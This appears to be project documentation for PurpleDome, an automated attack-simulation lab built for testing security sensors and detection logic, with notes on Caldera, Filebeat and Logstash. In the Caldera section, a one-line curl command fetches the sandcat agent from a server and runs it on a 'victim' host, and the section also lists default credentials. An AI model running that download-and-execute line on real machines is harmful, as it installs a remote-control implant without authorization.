======
Basics
======

Purple Dome is a simulated and automated environment to experiment with hacking - and defense.

PurpleDome is relevant for you:

* If you develop sensors for bolt on security
* If you want to test detection logic for your bolt on security
* If you want to stress test mitigation around your vulnerable apps
* Experiment with hardening your OS or software
* Want to forensically analyse a system after an attack
* Do some blue team exercises
* Want to train ML on data from real attacks

PurpleDome simulates a small busniess network. It generates an attacker VM and target VMs. Automated attacks are then run against the targets.

Depending on which sensors you picked you will get their logs. And the logs from the attacks. Perfect to compare them side-by-side.

Attacks are written as small plugins and control pre-installed tools:

* Kali command line tools
* Caldera commands
* Metasploit

That way your experiments focus on behaviour detection. And not on whack-a-mole games with malware samples.

-------------------

Features
========

* Linux and Windows targets
* VM controller abstracted as plugins
    * Local vagrant based (debug and development)
    * Cloud based
* Attacks as plugins controlling
    * Caldera attacks
    * Kali attacks
    * Metasploit attacks
* Data collection: Attack log and sensor data in parallel with timestamps for matching events
* Vulnerability plugins: Modify the targets before the attack
* Sensor plugins: Write a simple wrapper around your sensor and integrate it into the experiments

Components
==========

The command line tools are the way you will interact with Purple Dome. Those are described in the *CLI* chapter.

The experiments are configured in YAML files, the format is described in the *configuration* chapter. You will also want to create some target VMs. You can do this manually or use Vagrant. Vagrant makes it simple to create Linux targets. Windows targets (with some start configuration) are harder and have an own chapter.

If you want to modify Purple Dome and contribute to it I can point you to the *Extending* chapter. Thanks to a plugin interface this is quite simple.





TODO: What sensors are pre-installed ?
TODO: How to attack it ?
TODO: How to contact the servers (ssh/...) ? Scriptable
TODO: How to run it without sudo ?
TODO: Which data is collected ? How to access it ? How to get data dumps out ?
TODO: Add Linux Server
TODO: Add Mac Server



Data aggregator
---------------

We currently can use logstash

There are several options for data aggregators:

* Fleet OSQuery aggregator: https://github.com/kolide/fleet
* The Hive


Sensors on Targets (most are Windows)
-------------------------------------

Those sensors are not integrated but could be nice to play with:

Palantir Windows Event forwarding: https://github.com/palantir/windows-event-forwarding

Autorun monitoring: https://github.com/palantir/windows-event-forwarding/tree/master/AutorunsToWinEventLog

Palantir OSquery: https://github.com/palantir/osquery-configuration

SwiftOnSecurity Sysmon config: https://github.com/SwiftOnSecurity/sysmon-config


Palantir OSQuery is mixed OS: Windows/Mac Endpoints, Linux Servers


Caldera
-------

Attack framework.

Starting: *python3 server.py --insecure*

Web UI on *http://localhost:8888/*

Credentials: *red/admin*

Documentation: Documentation: https://caldera.readthedocs.io/en/latest/

Installing client on victim (Linux):

server="http://192.168.178.45:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;chmod +x sandcat.go;./sandcat.go -server $server -group red -v

Filebeat
--------

Filebeat has a set of modules:

https://www.elastic.co/guide/en/beats/filebeat/6.8/filebeat-modules-overview.html

List modules: *filebeat modules list*

%% TODO: Add OSQueryD https://osquery.readthedocs.io/en/latest/introduction/using-osqueryd/

Logstash
--------

Logstash uses all .conf files in /etc/logstash/conf.d

https://www.elastic.co/guide/en/logstash/current/config-setting-files.html

Alternative: The Hive
---------------------

Sander Spierenburg (SOC Teamlead) seems to be interested in The Hive. So it is back in the game



Repos
-----

* The main part: https://git.int.avast.com/ai-research/purpledome
* Caldera fork to fix bugs: TBD
* Caldera Plugin for statistics: <add public git/avast folder>


Links
-----

* Others detecting this kind of things

    - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

